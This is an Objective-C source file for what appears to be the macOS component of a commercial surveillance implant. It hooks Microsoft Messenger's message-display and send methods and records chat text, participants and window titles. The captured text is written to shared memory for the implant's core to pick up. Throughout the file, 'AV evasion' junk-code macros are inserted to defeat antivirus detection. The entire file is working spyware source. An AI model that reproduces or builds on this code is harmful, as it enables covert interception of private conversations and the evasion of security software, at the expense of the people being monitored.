//
//  RCSMAgentIMMsnMessenger.m
//  RCSMac
//
//  Created by revenge on 4/15/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import <objc/runtime.h>

#import "RCSMInputManager.h"
#import "RCSMAgentIMMsnMessenger.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

static NSString *gMyself            = nil;
static NSMutableString *gLoggedText = nil;
static BOOL gIsMe                   = NO;

void logMessage(NSString *message)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSString *_topic                = @"";
  NSData *topic                   = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSString *_peers                = @"";
  NSData *peers                   = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSDictionary *windowInfo        = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSData *processName = [@"Microsoft Messenger" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_004
    
      topic = [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      peers = [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
    }
  else
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      if ([[windowInfo objectForKey: @"windowName"] length] == 0)
        {
          // AV evasion: only on release build
          AV_GARBAGE_006
        
          topic = [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          peers = [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          
          // AV evasion: only on release build
          AV_GARBAGE_002
        }
      else
        {
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          NSString *_windowName = [[windowInfo objectForKey: @"windowName"] copy];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          NSArray *splitString = nil;
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          if ([_windowName isEqualToString: @"Contact List"] == NO)
            {
              
              // AV evasion: only on release build
              AV_GARBAGE_007
              
              if ([_windowName rangeOfString: @" - "].location != NSNotFound)
                {
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_006
                  
                  splitString = [_windowName componentsSeparatedByString: @" - "];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_005
                  
                  _peers = [splitString objectAtIndex: 0];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_003
                  
                  _topic = [splitString objectAtIndex: 1];
                }
              else
                {
#ifdef DEBUG_IM_MESSENGER
                  errorLog(@"Token ' - ' not found in string (%@)", _windowName);
#endif
                }
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          NSMutableString *allPeers = [[NSMutableString alloc] init];
          if (gMyself != nil)
            {
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              [allPeers appendString: gMyself];
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              if ([_peers isEqualToString: @""] == NO)
                {
                  // AV evasion: only on release build
                  AV_GARBAGE_006
                
                  [allPeers appendString: @", "];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_001
                  
                }
            }
          else
            {
#ifdef DEBUG_IM_MESSENGER
              errorLog(@"myself is empty");
#endif
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          [allPeers appendString: _peers];
          
          // AV evasion: only on release build
          AV_GARBAGE_002

          peers = [allPeers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          topic = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          [allPeers release];
          [_windowName release];
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSData *content             = [message dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  short unicodeNullTerminator = 0x0000;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  tmTemp = gmtime(&rawtime);
  tmTemp->tm_year += 1900;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  tmTemp->tm_mon++;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  if (sizeof(long) == 4) // 32bit
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
    }
  
  // Process Name
  [entryData appendData: processName];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // Topic
  [entryData appendData: topic];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  // Peers
  [entryData appendData: peers];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  // Content
  [entryData appendData: content];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  shMemoryHeader->agentID         = AGENT_CHAT;
  shMemoryHeader->direction       = D_TO_CORE;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  shMemoryHeader->commandDataSize = [entryData length];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_IM_MESSENGER
      verboseLog(@"message: %@", message);
#endif
    }
  else
    {
#ifdef DEBUG_IM_MESSENGER
      errorLog(@"Error while logging message to shared memory");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [logData release];
  [entryData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
}

@implementation myIMWebViewController

- (void)ParseAndAppendUnicodeHook: (unichar *)arg1
                         inLength: (uint16_t)arg2
                          inStyle: (int)arg3
                          fIndent: (unsigned char)arg4
                  fParseEmoticons: (unsigned char)arg5
                       fParseURLs: (unsigned char)arg6
                     inSenderName: (int)arg7
                       fLocalUser: (CFStringRef)arg8
{
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [self ParseAndAppendUnicodeHook: arg1
                         inLength: arg2
                          inStyle: arg3
                          fIndent: arg4
                  fParseEmoticons: arg5
                       fParseURLs: arg6
                     inSenderName: arg7
                       fLocalUser: arg8];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSString *message = [[NSString alloc] initWithCharacters: (unichar *)arg1
                                                    length: arg2];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([message rangeOfString: @"says"].location != NSNotFound)
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      // <username> says:    <-- is being written to view
      if (gLoggedText == nil)
        {
          gLoggedText = [[NSMutableString alloc] init];
          NSString *peer = [[message componentsSeparatedByString: @" "] objectAtIndex: 0];
          if (gIsMe == YES && gMyself == nil)
            {
              gIsMe = NO;
              gMyself = [[NSString alloc] initWithString: peer];
              
              // AV evasion: only on release build
              AV_GARBAGE_004
            }
          [gLoggedText appendFormat: @"%@: ", peer];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
        }
      else
        {
#ifdef DEBUG_IM_MESSENGER
          errorLog(@"unexpected in says");
#endif
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
    }
  else if ([message rangeOfString: @"added to the conversation"].location != NSNotFound)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      // <username> has been added to the conversation
      if (gLoggedText == nil)
        {
          // AV evasion: only on release build
          AV_GARBAGE_004
        
          gLoggedText = [[NSMutableString alloc] init];
          
          // AV evasion: only on release build
          AV_GARBAGE_001
         
          [gLoggedText appendString: message];
          logMessage(gLoggedText);
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          [gLoggedText release];
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          gLoggedText = nil;
          
          // AV evasion: only on release build
          AV_GARBAGE_002
        }
      else
        {
#ifdef DEBUG_IM_MESSENGER
          errorLog(@"unexpected in add contact to multichat");
#endif
        }
    }
  else
    {
      // AV evasion: only on release build
      AV_GARBAGE_004
    
      // <message>    <-- aka real message is being written to view
      if (gLoggedText == nil)
        {
#ifdef DEBUG_IM_MESSENGER
          errorLog(@"unexpected in message");
#endif
        }
      else
        {
          // AV evasion: only on release build
          AV_GARBAGE_003
        
          [gLoggedText appendString: message];
          logMessage(gLoggedText);
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          [gLoggedText release];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          gLoggedText = nil;
          
          // AV evasion: only on release build
          AV_GARBAGE_003
        }
    }

  [message release];
}

@end

@implementation myIMWindowController

- (void)SendMessageHook: (unichar *)arg1
                cchText: (NSUInteger)arg2
                 inHTML: (NSString *)arg3
{
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if (gMyself == nil)
  {
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    gIsMe = YES;
  }
  else
  {
#ifdef DEBUG_IM_MESSENGER
    warnLog(@"myself is not nil: %@", gMyself);
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [self SendMessageHook: arg1
                cchText: arg2
                 inHTML: arg3];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
}

@end